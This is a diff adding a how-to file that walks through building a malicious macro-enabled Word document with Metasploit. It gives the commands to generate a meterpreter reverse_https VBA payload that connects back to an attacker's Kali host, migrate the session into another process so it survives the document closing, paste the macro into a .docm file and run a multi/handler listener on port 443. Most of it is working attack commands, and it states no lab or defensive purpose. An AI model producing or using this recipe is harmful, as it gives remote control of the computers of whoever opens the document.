@@ -1,0 +1,80 @@
+
+
+	** Creating the malicious document **
+
+Need a malicious, macro enabled document that will create a remote connection back to Metasploit when a user opens it and runs the macro (Office document)
+Metasploit as it does all the hard work of creating the attack and then handling the connect-back once the document has been opened.
+
+	type "msf
+console"
+
+type " use windows/meterpreter/reverse_https "
+	
+	metasploit will use the reverse TCP shell payload
+
+type " set LHOST <your Kali IP> "
+
+	This will tell the payload what IP to connect to (i.e. where you want the victim to connect back to)
+
+type " set LPORT 443 "
+
+	This will tell the payload what port to use to connect. 
+
+type " set AutoRunScript post/windows/manage/smart_migrate "
+
+	Will migrate your remote connection from the Word process to a different process such as the Explorer process,if the document closes you will still have your connection.
+
+
+type " generate -f vba "
+
+	Generates some basic VBA code that you can simply copy from the terminal window to paste in a document.
+
+
+
+	 ** Setting up the document **
+
+1. On Kali copy everything from “#If Vba7 Then” to the final “End Sub”
+2. In Word go to the " View " tab and select " Macros ".
+3. In the VBA code page that opens highlight all the text and delete it, then paste your code you copied from Metasploit.
+4. Save the document as a .docm or Word Macro-Enabled Document in a folder on the computer.
+
+
+
+
+
+
+
+
+
+		** Setting up the receiver **
+
+open a terminal window and type msfconsole and hit enter to open Metasploit.
+
+type " msfconsole "
+
+
+
+type " use exploit/multi/handler "
+
+	This will tell Metasploit to use the multi handler exploit
+
+
+type " set PAYLOAD windows/meterpreter/reverse_https "
+
+	Tells the multi handler what payload to expect, since we are using a reverse_https payload in the macro enabled document we tell it to use that
+
+
+type " set LHOST <your Kali IP > "
+
+	This will tell the handler what IP to listen on
+
+type " set LPORT 443 "
+
+	 Tell the handler what port to listen on. I like using 443 or 80 as in a real situation these are likely to be open for users to connect to the internet from.
+
+type " exploit "
+
+
+
+
+
